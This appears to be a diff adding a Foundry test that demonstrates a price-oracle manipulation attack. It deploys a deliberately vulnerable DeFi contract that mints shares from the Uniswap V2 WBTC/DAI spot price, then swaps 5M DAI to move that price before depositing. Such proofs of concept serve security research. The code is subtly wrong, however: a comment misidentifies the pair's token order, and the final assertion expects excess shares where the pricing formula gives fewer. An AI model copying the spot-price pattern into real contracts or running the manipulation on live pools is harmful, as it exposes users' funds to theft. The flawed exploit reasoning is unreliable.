@@ -1,0 +1,154 @@
+```solidity
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// Uniswap V2 interfaces
+interface IUniswapV2Router02 {
+    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
+    function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
+    function WETH() external view returns (address);
+    function factory() external view returns (address);
+}
+
+interface IUniswapV2Factory {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2Pair {
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
+}
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint);
+    function transfer(address recipient, uint amount) external returns (bool);
+    function approve(address spender, uint amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
+}
+
+// Mock vulnerable contract that uses the Uniswap WBTC/DAI price to mint shares
+contract VulnerableProtocol {
+    IUniswapV2Router02 public constant router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    IERC20 public wbtc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
+    IERC20 public dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
+
+    mapping(address => uint) public balances;
+    uint public totalShares;
+
+    // Price function exactly as the vulnerable contract would use
+    function getPrice() public view returns (uint) {
+        address[] memory path = new address[](2);
+        path[0] = address(dai);
+        path[1] = address(wbtc);
+        uint[] memory amounts = router.getAmountsIn(1e8, path); // 1 WBTC = 1e8 smallest units
+        return amounts[0]; // returns amount of DAI needed for 1 WBTC
+    }
+
+    // Function that uses the price to mint shares based on DAI deposit
+    function deposit(uint daiAmount) external {
+        dai.transferFrom(msg.sender, address(this), daiAmount);
+        uint price = getPrice(); // DAI per 1 WBTC
+        // mint shares = (daiAmount * 1e18) / price   (assuming price in DAI per WBTC)
+        uint shares = (daiAmount * 1e18) / price;
+        balances[msg.sender] += shares;
+        totalShares += shares;
+    }
+
+    // Allow retrieving deposited DAI for testing
+    function withdraw() external {
+        uint shares = balances[msg.sender];
+        uint totalDai = dai.balanceOf(address(this));
+        uint daiAmount = (shares * totalDai) / totalShares;
+        balances[msg.sender] = 0;
+        dai.transfer(msg.sender, daiAmount);
+    }
+}
+
+contract OracleManipulationPoC is Test {
+    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
+    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+    address constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+
+    IUniswapV2Router02 router = IUniswapV2Router02(ROUTER);
+    IUniswapV2Factory factory = IUniswapV2Factory(FACTORY);
+    IERC20 wbtc = IERC20(WBTC);
+    IERC20 dai = IERC20(DAI);
+    IUniswapV2Pair pool;
+
+    VulnerableProtocol protocol;
+
+    function setUp() public {
+        // Retrieve the WBTC/DAI pool address
+        pool = IUniswapV2Pair(factory.getPair(WBTC, DAI));
+        require(address(pool) != address(0), "Pool not found");
+
+        // Deploy vulnerable protocol
+        protocol = new VulnerableProtocol();
+
+        // Label addresses for clarity
+        vm.label(WBTC, "WBTC");
+        vm.label(DAI, "DAI");
+        vm.label(ROUTER, "UniswapV2Router02");
+        vm.label(FACTORY, "UniswapV2Factory");
+        vm.label(address(pool), "WBTC/DAI Pool");
+        vm.label(address(protocol), "VulnerableProtocol");
+
+        // Get some DAI for the attacker (deal cheatcode)
+        deal(DAI, address(this), 10_000_000 ether); // 10M DAI
+    }
+
+    function testOracleManipulation() public {
+        // Get initial price from protocol (simulate honest oracle)
+        uint initialPrice = protocol.getPrice();
+        emit log_named_uint("Initial price (DAI per 1 WBTC)", initialPrice);
+
+        // Attacker deposits DAI before manipulation to get a baseline
+        dai.approve(address(protocol), 100_000 ether);
+        protocol.deposit(100_000 ether);
+        uint sharesBefore = protocol.balances(address(this));
+        emit log_named_uint("Shares before manipulation", sharesBefore);
+
+        // --- Manipulate the oracle ---
+        // Flash loan/swaps to drain WBTC from the pool, thereby increasing the DAI cost per WBTC
+        // We will use a direct swap: swap a large amount of DAI to WBTC
+        uint swapAmount = 5_000_000 ether; // 5M DAI
+        dai.approve(address(router), swapAmount);
+        address[] memory path = new address[](2);
+        path[0] = DAI;
+        path[1] = WBTC;
+        // Get minimum amount out by simulating current reserves
+        (uint112 reserve0, uint112 reserve1,) = pool.getReserves();
+        // Order: WBTC reserve0, DAI reserve1? Check Uniswap: token0 is WBTC? Actually depends on ordering.
+        // For most pairs, token0 is the one with lower address: 0x2260... > 0x6B17... so DAI is token0? No, 0x2260 > 0x6B17, so WBTC (0x2260) > DAI (0x6B17), so token0 = DAI? Let's check: In Uniswap, token0 is address lower. 0x6B175474E89094C44Da98b954EedeAC495271d0F < 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, so token0 = DAI, token1 = WBTC. So reserve0 = DAI, reserve1 = WBTC.
+        uint daiReserve = uint(reserve0);
+        uint wbtcReserve = uint(reserve1);
+        // Amount out = wbtcReserve - (k / (daiReserve + amountIn))  (approximate)
+        uint amountOut = wbtcReserve - (daiReserve * wbtcReserve) / (daiReserve + swapAmount);
+        uint minAmountOut = amountOut * 99 / 100; // 1% slippage
+        router.swapExactTokensForTokens(swapAmount, minAmountOut, path, address(this), block.timestamp);
+
+        // After swap, price should have increased (more DAI needed per WBTC)
+        uint newPrice = protocol.getPrice();
+        emit log_named_uint("New price (DAI per 1 WBTC)", newPrice);
+
+        // Now attacker deposits more DAI at the inflated price
+        dai.approve(address(protocol), 100_000 ether);
+        protocol.deposit(100_000 ether);
+        uint sharesAfter = protocol.balances(address(this));
+        emit log_named_uint("Shares after manipulation (second deposit)", sharesAfter - sharesBefore);
+
+        // The attacker now has more shares than they should have because the price was manipulated
+        // If they withdraw later, they would get more DAI than deposited
+        // Assert profit: total shares increased disproportionately
+        uint totalSharesAfter = protocol.totalShares();
+        uint totalDaiAfter = dai.balanceOf(address(protocol));
+        // Normally, shares = deposit / price, but because price is inflated, second deposit gave more shares
+        // The attacker's share of total is higher than honest proportion
+        uint expectedShares = (100_000 ether * 1e18) / initialPrice; // honest price
+        uint actualShares = sharesAfter - sharesBefore;
+        assertGt(actualShares, expectedShares, "Oracle manipulation should yield excess shares");
+    }
+}
+```
